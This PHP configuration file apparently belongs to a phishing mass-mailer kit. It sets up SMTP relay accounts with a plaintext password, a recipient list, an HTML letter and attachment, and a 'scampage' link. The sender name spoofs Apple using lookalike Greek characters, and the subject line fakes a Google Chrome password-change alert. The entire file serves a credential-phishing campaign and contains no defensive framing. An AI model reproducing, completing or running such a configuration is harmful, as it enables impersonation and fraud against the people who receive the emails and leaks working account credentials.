<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "databaseamazonsecure.confirmednoreply39612@amountopup.business",
        "password" => "zxcdsaqwe:;321"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "databaseamazonsecure.confirmednoreply39612@amountopup.business",
        "password" => "zxcdsaqwe:;321"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "databaseamazonsecure.confirmednoreply39612@amountopup.business",
        "password" => "zxcdsaqwe:;321"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/tester.txt",
    "fromname"       => "Aρρle Alert",
    "frommail"       => "noreplying-applelocked-service##randstring##@live.com",
    "subject"        => "RE: [ Alert ] Confirmation password changed on your account in Google Chrome ( 03 June, 2019 ). [FWD]",
    "msgfile"        => "file/letter/letter.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://hootsuite.com"],
];
